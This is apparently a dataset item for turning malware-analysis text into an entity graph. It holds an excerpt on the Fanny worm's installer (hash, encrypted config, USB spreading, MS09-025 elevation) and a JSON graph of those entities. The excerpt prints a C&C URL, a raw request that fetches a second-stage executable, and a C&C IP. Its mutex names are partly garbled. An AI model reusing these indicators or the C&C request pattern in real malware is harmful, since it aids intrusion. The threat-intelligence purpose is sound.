@@ -1,0 +1,85 @@
+
+
+
+Sentence : Fanny modules
+MD5 0a209ac0de4ac033f31d6ba9191a8f7a
+Size 184320
+Type Win32 DLL
+Internal name dll_installer.dll
+Compiled 2008.07.28 08:11:35 (GMT)
+This file is a DLL with two exports (to install and uninstall the malware). It
+contains a xor-encrypted config in binary resource with number 101. The
+config determines malware behavior: there is a command to deploy
+malware on the current system, URLs for the C&C server and local
+filenames and paths used to install embedded malware components.
+Fanny components inside the main executable
+Upon starting it checks the following mutexes:
+Global\RPCMutex
+Global\RPCMutex
+Where is a 1-byte long integer taken from the config. If any of these
+mutexes exist, the code doesn’t run. It means that another instance of the
+same code is running. InstanceNum most likely identifies a variant or
+generation of Fanny preventing the same version from reinfecting the
+system but allowing for different versions to run (possibly to enable
+enforced update of components).
+The module also checks another important byte in its configuration. This
+byte is a counter that is decreased during successful system infection.
+When the counter reaches a minimal value of one the module cleans up
+the USB drive and stops spreading the worm. In this way the attackers
+limit the maximum length of the Worm’s killchain.
+If the module is named “fanny.bmp” (the file name that Fanny uses to
+spread via USB drives) the module self-installs from the USB drive.
+As part of the initial infection process Fanny attempts to elevate current
+privileges if the user has no administrative rights on the current system. It
+uses a vulnerability patched by MS09-025 for that purpose. Only if the
+elevation succeeds does the malware attempt to connect to the C&C
+server using a URL which is stored in the config:
+http://webuysupplystore[.]mooo[.]com/ads/QueryRecord200586_f2
+ahx.html
+Below is a sample request issued by the malware:
+GET /ads/QueryRecord200586_f2ahx.html HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible;)
+Host: webuysupplystore.mooo.com
+The malware expects the C&C server to reply with an HTTP 200 response
+and append a 0x7f-xored string that has a second stage URL. The second
+stage response may contain an executable file body which is saved on
+disk and executed.
+The C&C server is currently sinkholed by Kaspersky Lab, but according to
+our pDNS records it previously pointed to the following IP address:
+210.81.22.239
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "Fanny modules", "type" : "EXEF"},
+        {"id": 2, "description": "MD5 0a209ac0de4ac033f31d6ba9191a8f7a", "type" : "IOCS"},
+        {"id": 3, "description": "Size 184320", "type" : "TAMP"},
+        {"id": 4, "description": "Type Win32 DLL", "type" : "EXEF"},
+        {"id": 5, "description": "dll_installer.dll", "type" : "DOCF"},
+        {"id": 6, "description": "xor-encrypted config in binary resource with number 101", "type" : "TAMP"},
+        {"id": 7, "description": "Global\\RPCMutex", "type" : "REGI"},
+        {"id": 8, "description": "1-byte long integer from the config", "type" : "TAMP"},
+        {"id": 9, "description": "InstanceNum", "type" : "TAMP"},
+        {"id": 10, "description": "counter in configuration", "type" : "TAMP"},
+        {"id": 11, "description": "fanny.bmp", "type" : "DOCF"},
+        {"id": 12, "description": "USB drive", "type" : "USB"},
+        {"id": 13, "description": "MS09-025", "type" : "CVES"},
+        {"id": 14, "description": "C&C server URL: http://webuysupplystore[.]mooo[.]com/ads/QueryRecord200586_f2ahx.html", "type" : "URLS"},
+        {"id": 15, "description": "GET /ads/QueryRecord200586_f2ahx.html HTTP/1.1", "type" : "TAMP"},
+        {"id": 16, "description": "C&C server IP address: 210.81.22.239", "type" : "CCSH"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "has IOCS"},
+        {"source": 1, "target": 5, "rel_name" : "contains file"},
+        {"source": 1, "target": 6, "rel_name" : "contains config"},
+        {"source": 1, "target": 7, "rel_name" : "checks mutex"},
+        {"source": 1, "target": 8, "rel_name" : "uses value from"},
+        {"source": 1, "target": 9, "rel_name" : "identifies variant with"},
+        {"source": 1, "target": 10, "rel_name" : "decreases counter"},
+        {"source": 1, "target": 11, "rel_name" : "uses file name"},
+        {"source": 1, "target": 12, "rel_name" : "spreads via"},
+        {"source": 1, "target": 13, "rel_name" : "exploits vulnerability"},
+        {"source": 1, "target": 14, "rel_name" : "connects to C&C server using URL"},
+        {"source": 1, "target": 15, "rel_name" : "issues request"},
+        {"source": 14, "rel_name" : "points to", "target": 16}
+    ]
+}
